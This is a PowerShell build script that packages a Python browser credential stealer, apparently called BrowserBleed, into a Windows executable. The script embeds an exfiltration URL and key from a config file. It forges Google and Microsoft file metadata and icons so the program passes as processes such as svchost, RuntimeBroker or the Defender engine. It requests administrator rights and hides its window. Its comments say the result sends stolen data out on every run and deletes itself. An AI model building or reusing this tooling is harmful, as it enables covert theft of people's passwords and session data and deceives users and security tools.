# build_windows.ps1 — builds a credential-harvesting exe with the report server baked in.
# Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
#   .\build_windows.ps1
#
# The resulting exe auto-exfils on every run, leaves no local files, and self-deletes.
# Override at runtime with: --out PATH  --no-self-delete  --exfil URL  --exfil-key KEY
#
# Common examples:
#   .\build_windows.ps1                                        # chrome_crashpad_handler.exe
#   .\build_windows.ps1 -ExeName RuntimeBroker                # RuntimeBroker.exe (Microsoft metadata)
#   .\build_windows.ps1 -ExeName MicrosoftEdgeUpdate          # Edge update process
#   .\build_windows.ps1 -ExeName chrome_crashpad_handler `
#       -IconFile "C:\Program Files\Google\Chrome\Application\chrome.exe"

param(
    [string]$ExfilUrl  = "",
    [string]$ExfilKey  = "",
    [string]$ExeName   = "chrome_crashpad_handler",
    [string]$IconFile  = "",    # path to .ico or .exe to extract icon from
    [string]$Company   = "",    # override CompanyName in Properties (auto-set by preset)
    [string]$FileDesc  = ""     # override FileDescription in Properties (auto-set by preset)
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ── Load deploy/config if values not passed in ────────────────────────────────
if (-not $ExfilUrl -or -not $ExfilKey) {
    $configPath = Join-Path $PSScriptRoot "deploy\config"
    if (Test-Path $configPath) {
        foreach ($line in Get-Content $configPath) {
            if ($line -match '^DOMAIN=(.+)$'     -and -not $ExfilUrl) { $ExfilUrl = "https://$($Matches[1])" }
            if ($line -match '^BB_API_KEY=(.+)$' -and -not $ExfilKey) { $ExfilKey = $Matches[1].Trim() }
        }
    }
}

if (-not $ExfilUrl) { Write-Error "ExfilUrl not set — add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
if (-not $ExfilKey) { Write-Error "ExfilKey not set — add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }

# ── Metadata presets (auto-populates Properties / Task Manager Description) ───
$presets = @{
    "chrome_crashpad_handler" = @{ Company = "Google LLC";            Desc = "Google Chrome"                          }
    "chrome"                  = @{ Company = "Google LLC";            Desc = "Google Chrome"                          }
    "GoogleUpdate"            = @{ Company = "Google LLC";            Desc = "Google Update"                          }
    "MicrosoftEdgeUpdate"     = @{ Company = "Microsoft Corporation"; Desc = "Microsoft Edge Update"                  }
    "RuntimeBroker"           = @{ Company = "Microsoft Corporation"; Desc = "Runtime Broker"                         }
    "SearchIndexer"           = @{ Company = "Microsoft Corporation"; Desc = "Microsoft Windows Search Indexer"       }
    "svchost"                 = @{ Company = "Microsoft Corporation"; Desc = "Host Process for Windows Services"      }
    "MsMpEng"                 = @{ Company = "Microsoft Corporation"; Desc = "Antimalware Service Executable"         }
    "OneDrive"                = @{ Company = "Microsoft Corporation"; Desc = "Microsoft OneDrive"                     }
    "Teams"                   = @{ Company = "Microsoft Corporation"; Desc = "Microsoft Teams"                        }
}

if ($presets.ContainsKey($ExeName)) {
    if (-not $Company)   { $Company  = $presets[$ExeName].Company }
    if (-not $FileDesc)  { $FileDesc = $presets[$ExeName].Desc    }
} else {
    if (-not $Company)   { $Company  = "Microsoft Corporation" }
    if (-not $FileDesc)  { $FileDesc = $ExeName                }
}

Write-Host "[*] Building $ExeName.exe"
Write-Host "    Exfil URL:    $ExfilUrl"
Write-Host "    Exfil key:    $($ExfilKey.Substring(0,4))****"
Write-Host "    Process name: $ExeName"
Write-Host "    Description:  $FileDesc ($Company)"

# ── Patch a temp copy of the source ──────────────────────────────────────────
$src    = Join-Path $PSScriptRoot "BrowserBleed.py"
$tmpSrc = Join-Path $env:TEMP "BrowserBleed_build.py"

(Get-Content $src -Raw) `
    -replace '_EXFIL_URL: str = ""', "_EXFIL_URL: str = `"$ExfilUrl`"" `
    -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`"" |
    Set-Content -Path $tmpSrc -Encoding utf8

# ── Generate version-info file (sets Description + Company in Properties) ────
$verFile = Join-Path $env:TEMP "bb_version.txt"
@"
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0), prodvers=(1, 0, 0, 0),
    mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0,
    date=(0, 0)),
  kids=[
    StringFileInfo([
      StringTable(u'040904B0', [
        StringStruct(u'CompanyName',      u'$Company'),
        StringStruct(u'FileDescription',  u'$FileDesc'),
        StringStruct(u'FileVersion',      u'1.0.0.0'),
        StringStruct(u'InternalName',     u'$ExeName'),
        StringStruct(u'OriginalFilename', u'$ExeName.exe'),
        StringStruct(u'ProductName',      u'$FileDesc'),
        StringStruct(u'ProductVersion',   u'1.0.0.0')])
    ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
"@ | Set-Content -Path $verFile -Encoding utf8

# ── Build ─────────────────────────────────────────────────────────────────────
$buildTmp  = Join-Path $env:TEMP "bb_build"
$iconArgs  = if ($IconFile -and (Test-Path $IconFile)) { @("--icon", $IconFile) } else { @() }

python -m PyInstaller `
    --onefile --noconsole --uac-admin `
    --name $ExeName `
    --version-file $verFile `
    @iconArgs `
    --distpath $PSScriptRoot `
    --workpath $buildTmp `
    --specpath $buildTmp `
    $tmpSrc

Remove-Item $tmpSrc  -Force -ErrorAction SilentlyContinue
Remove-Item $verFile -Force -ErrorAction SilentlyContinue
Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[+] Done: $PSScriptRoot\$ExeName.exe"
Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
